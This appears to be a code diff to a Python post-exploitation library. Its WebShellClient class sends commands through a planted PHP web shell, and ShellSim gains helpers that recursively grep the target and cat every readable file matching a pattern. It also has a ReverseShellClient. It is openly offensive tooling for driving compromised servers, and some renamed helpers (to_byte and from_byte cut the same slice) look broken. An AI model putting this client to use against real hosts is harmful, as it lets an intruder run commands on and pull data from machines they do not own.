@@ -163,7 +163,6 @@ class ShellSim(object):
         self._host = ''
         self.prompt = term.text.bold_blue('{user}') \
                 + '@{host} ' + term.text.bold("{cwd}") + ' > '
-        self.get_remote_info()
         self.__marker = None
 
     def execute(self, cmd):
@@ -184,8 +183,8 @@ class ShellSim(object):
         if not res:
             log.warn("get remote info failed")
             return
-        self._user, self._cwd, self._hostname = map(lambda s: s.strip(),
-                                                    res.split(marker))
+        self._user, self._cwd, self._host = map(lambda s: s.strip(),
+                                                res.split(marker))
 
     def command(self, cmd):
         if isinstance(cmd, str):
@@ -203,6 +202,7 @@ class ShellSim(object):
     e = command
 
     def interactive(self):
+        self.get_remote_info()
         go = True
         try:
             while go:
@@ -288,7 +288,7 @@ class ShellSim(object):
         if self.onclose:
             self.onclose()
 
-    def read_all_files_like(self, regex, indir='/'):
+    def read_all_files_like(self, regex, indir='.'):
         if not self.__marker:
             self.__marker = "-_- o_O {} O_o -_-"\
                     .format(binascii.hexlify(os.urandom(10)))
@@ -302,7 +302,7 @@ class ShellSim(object):
         i = iter(splitted)
         return {k.strip(): v for k, v in zip(i, i)}
 
-    def print_all_files_like(self, regex, indir='/'):
+    def print_all_files_like(self, regex, indir='.'):
         printf = "---- %p ----\\n"
         cmdtpl = "find '{}' -regex '{}' -readable -type f -printf '{}'" + \
                 " -exec cat '{{}}' \; 2>/dev/null"
@@ -311,6 +311,13 @@ class ShellSim(object):
         # sys.stdout.write(res)
         # sys.stdout.flush()
         return res
+
+    def grep_for(self, regex, indir='.', i=False):
+        grep_opts = ["-r"]
+        if i:
+            grep_opts.append("-i")
+        grepcmd = "grep {} '{}' {}".format(" ".join(grep_opts), regex, indir)
+        return self.execute(grepcmd)
 
 
 class WebShellClient(ShellSim):
@@ -322,21 +329,22 @@ class WebShellClient(ShellSim):
 
     You can then do something like this:
 
-        ws = WebShellClient('http://vuln.example.com/sh.php', "cmd")
-        print ws.command("ls")
-        ws.interactive()
+        >>> ws = WebShellClient('http://vuln.example.com/sh.php', "cmd")
+        >>> print ws.command("ls")
+        sh.php vuln.php
+        >>> ws.interactive()
 
     To get a rather nice looking shell.
     """
 
     def __init__(self, url, param=None, data={}, method='GET',
                  download_dir="./downloads/"):
-        super(WebShellClient, self).__init__(self, None, onlyascii=True,
-                                             download_dir=download_dir)
+        ShellSim.__init__(self, None, onlyascii=True,
+                          download_dir=download_dir)
         self.url = url
         self.param = param
         self.method = method
-        self.data = data
+        self.req_data = data
         self._session = requests.session()
 
     def execute(self, cmd):
@@ -345,14 +353,19 @@ class WebShellClient(ShellSim):
         else:
             cd_cmd = "{}".format(cmd)
 
-        data = self.data.copy()
-        data[self.param] = cmd
+        if self.pre:
+            cd_cmd = self.pre(cd_cmd)
+        data = self.req_data.copy()
+        data[self.param] = cd_cmd
         if self.method.lower() == 'get':
-            res = self._session.get(self.url, data=data)
+            res = self._session.get(self.url, params=data)
         elif self.method.lower() == 'post':
             res = self._session.post(self.url, data=data)
 
-        return res.text
+        s = res.text
+        if self.post:
+            s = self.post(s)
+        return s
 
 
 class ReverseShellClient(ShellSim):
@@ -377,23 +390,23 @@ class ReverseShellClient(ShellSim):
 # passed.
 
 
-def tail_bytes(N):
+def from_byte(N):
     return lambda buf: buf[N:]
 
 
-def head_bytes(N):
+def to_byte(N):
     return lambda buf: buf[N:]
 
 
-tail_chars = tail_bytes
-head_chars = head_bytes
+to_char = to_byte
+from_chars = from_byte
 
 
-def head_lines(N):
+def to_line(N):
     return lambda buf: "\n".join(buf.split("\n")[:N])
 
 
-def tail_lines(N):
+def from_line(N):
     return lambda buf: "\n".join(buf.split("\n")[N:])
 
 
